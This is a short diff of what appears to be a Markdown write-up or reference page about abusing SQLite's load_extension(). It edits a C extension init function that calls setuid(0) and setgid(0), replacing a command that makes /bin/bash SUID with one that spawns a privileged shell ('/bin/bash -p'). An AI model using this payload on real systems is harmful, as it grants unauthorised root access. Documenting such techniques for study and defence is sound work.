@@ -800,7 +800,7 @@ Error: wrong number of arguments to function load_extension()
 void sqlite_a_init() {
     setuid(0);
     setgid(0);
-    system("chmod u+s /bin/bash");
+    system("/bin/bash -p");
 }
 ~~~
 
